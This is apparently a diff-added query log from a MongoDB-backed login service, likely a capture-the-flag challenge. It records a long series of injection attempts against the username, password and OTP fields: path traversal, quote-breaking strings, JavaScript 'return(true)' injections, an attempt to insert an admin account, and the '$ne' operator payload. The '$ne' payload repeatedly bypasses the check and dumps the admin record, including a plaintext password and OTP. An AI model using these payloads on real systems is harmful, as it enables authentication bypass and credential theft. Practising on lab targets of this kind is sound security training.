.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'WEB-INF/web.xml', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'WEB-INF\\web.xml', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin\u2019}});//', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin\u2019})}//', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'123', u'password': u'admin12'}}
+None
+Query: {'username': u"admin' or ''='", 'auth': {u'otp': u'123', u'password': u"admin' or ''='"}}
+None
+Query: {'username': u"admin'})}//", 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u"admin'})}//", 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u"admin'})}//", 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin"})}//', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin"})}//', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin"})}//', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin"})}//', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin"""', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin"""', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'123', u'password': u'admin'}}
+None
+Query: {'username': u'admin"""', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u"admin'}//", 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'\'}), mongo.db.login.insert({\'username\': \'admin\', \'auth\':{"password":"admin","otp":"1234"}), 1 } //', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'" OR 1 --'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'asd', 'auth': {u'otp': u'', u'password': u'asd'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'otp': u'1337', u'password': u'$up3rP455w0rd!|'}}
+None
+Query: {'username': u'admin@admin.com', 'auth': {u'otp': u'1337', u'password': u'$up3rP455w0rd!|'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1337', u'password': u'$up3rP455w0rd!'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'SCRIPT LOAD end;--', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'{"$ne": "moo"}'}}
+None
+Query: {'username': u'admin"})//', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin"})-- -', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'3rfsdsf', u'password': u"1995'; return(true); var%20foo='bar"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u"1995';return(true);var foo='bar", u'password': u'asdf'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u"1995' or '1'='1", u'password': u'asdf'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'otp': u'1995" || "1"="1', u'password': u'asdf'}}
+None
+Query: {'username': u'admikn', 'auth': {u'otp': u'moo', u'password': u'$ne'}}
+None
+Query: {'username': u'lal', 'auth': {u'otp': u'laala', u'password': u'la'}}
+None
+Query: {'username': u'123', 'auth': {u'otp': u'789', u'password': u'456'}}
+None
+Query: {'username': u'admin"//', 'auth': {u'otp': u'1995" || "1"="1', u'password': u'asdf'}}
+None
+Query: {'username': u"admin'//", 'auth': {u'otp': u'1995" || "1"="1', u'password': u'asdf'}}
+None
+Query: {'username': u"admin' || ", 'auth': {u'otp': u'1995" || "1"="1', u'password': u'asdf'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'moo'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'moo'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u"'", u'password': u'asdf'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'; ', u'password': u'asdf'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'/*', u'password': u'asdf'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin"});', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin"});', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin"})', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin"})#', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin'})#", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin'})##", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin'})##", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin'})##", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin'})##", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"username=admin'})#", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'username=admin"})#', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'{"$in" : "admin"}', 'auth': {u'otp': u'{"$nin" : ""}', u'password': u'{"$nin" : ""}'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'*', u'password': u'*'}}
+None
+Query: {'username': u'function() { return true; }', 'auth': {u'otp': u'function() { return true; }', u'password': u'function() { return true; }'}}
+None
+Query: {'username': u'$all', 'auth': {u'otp': u'$all', u'password': u'$all'}}
+None
+Query: {'username': u"admin'});", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin'});//", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin'});//", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin'});//", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'guest', 'auth': {u'otp': u'%', u'password': u'%'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'', u'': u'', u'password': u'%'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'guest', 'auth': {u'otp': u'or 1', u'': u'', u'password': u'%'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'a or 1', u'': u'', u'password': u'%'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
